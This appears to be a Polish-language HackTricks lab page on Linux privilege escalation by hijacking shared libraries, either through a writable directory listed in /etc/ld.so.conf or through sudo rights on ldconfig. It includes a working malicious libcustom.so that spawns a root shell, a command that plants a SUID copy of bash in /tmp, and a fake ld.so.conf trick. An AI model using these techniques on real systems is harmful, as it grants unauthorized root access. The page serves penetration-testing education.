# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Przygotowanie środowiska

W poniższej sekcji znajdziesz kod plików, których użyjemy do przygotowania środowiska

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Utwórz** te pliki na swojej maszynie w tym samym folderze
2. **Skompiluj** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Skopiuj** `libcustom.so` do `/usr/lib` i odśwież cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (uprawnienia root)
4. **Skompiluj** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Sprawdź środowisko

Sprawdź, czy _libcustom.so_ jest **ładowany** z _/usr/lib_ oraz czy możesz **uruchomić** plik binarny.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Przydatne polecenia triage

Podczas atakowania rzeczywistego celu sprawdź **dokładną nazwę biblioteki**, której potrzebuje binary, oraz to, co **loader obecnie rozwiązuje**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Kilka przydatnych pułapek:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` zwykle **nie działa**, ponieważ
przekierowanie jest wykonywane przez bieżący shell. Zamiast tego użyj
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Binaries **SUID/privileged** ignorują `LD_LIBRARY_PATH`/`LD_PRELOAD` w
**secure-execution mode**, ale katalogi pochodzące z `/etc/ld.so.conf` nadal
są częścią zaufanej konfiguracji loadera, więc ta błędna konfiguracja nadal
może wpływać na programy uprzywilejowane.
- W nowszych wersjach glibc dynamic loader udostępnia również
`--list-diagnostics`, co jest przydatne do debugowania rozwiązywania cache
oraz wyboru podkatalogu `glibc-hwcaps`, gdy hijack nie zachowuje się zgodnie
z oczekiwaniami.

## Exploit

W tym scenariuszu założymy, że **ktoś utworzył podatny wpis** wewnątrz pliku w _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Podatny folder to _/home/ubuntu/lib_ (do którego mamy dostęp z prawem zapisu).\
**Pobierz i skompiluj** poniższy kod w tej ścieżce:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Jeśli oczekujesz, że **root** (lub inne uprzywilejowane konto) uruchomi później podatny plik binarny, zwykle lepiej pozostawić **artefakt należący do root**, zamiast uruchamiać interaktywną powłokę. Na przykład:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Następnie, po wykonaniu uprzywilejowanej operacji, możesz użyć `/tmp/rootbash -p`.

Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w błędnie skonfigurowanej** ścieżce, musimy poczekać na **reboot** lub na wykonanie przez użytkownika root polecenia **`ldconfig`** (_jeśli możesz wykonać ten binary jako **sudo** lub ma on **suid bit**, będziesz w stanie wykonać go samodzielnie_).

Po wykonaniu tej czynności **ponownie sprawdź**, skąd executable `sharedvuln` ładuje bibliotekę `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Jak widać, **ładuje ją z `/home/ubuntu/lib`** i jeśli dowolny użytkownik ją wykona, zostanie uruchomiona powłoka:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Zauważ, że w tym przykładzie nie uzyskaliśmy eskalacji uprawnień, ale modyfikując wykonywane polecenia i **czekając, aż użytkownik root lub inny uprzywilejowany użytkownik wykona podatny plik binarny**, będziemy w stanie przeprowadzić eskalację uprawnień.

### Inne błędne konfiguracje - ta sama luka

W poprzednim przykładzie sfabrykowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprawnień uprzywilejowanych w pliku konfiguracyjnym znajdującym się w `/etc/ld.so.conf.d/`**.\
Istnieją jednak inne błędne konfiguracje, które mogą powodować tę samą podatność. Jeśli masz **uprawnienia zapisu** do dowolnego **pliku konfiguracyjnego** znajdującego się w `/etc/ld.so.conf.d`, do folderu `/etc/ld.so.conf.d` lub do pliku `/etc/ld.so.conf`, możesz skonfigurować tę samą podatność i ją wykorzystać.

## Exploit 2

**Załóżmy, że masz uprawnienia sudo dla `ldconfig`**.\
Możesz wskazać `ldconfig`, **skąd ma ładować pliki conf**, więc możemy to wykorzystać, aby zmusić `ldconfig` do ładowania dowolnych folderów.\
Utwórzmy więc pliki i foldery potrzebne do załadowania `/tmp`:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Teraz, jak wskazano w **poprzednim exploicie**, **utwórz złośliwą bibliotekę w `/tmp`**.\
Na koniec załaduj ścieżkę i sprawdź, skąd plik binarny ładuje bibliotekę:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Jak widać, posiadając uprawnienia sudo do `ldconfig`, można wykorzystać tę samą podatność.**



## Odnośniki

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
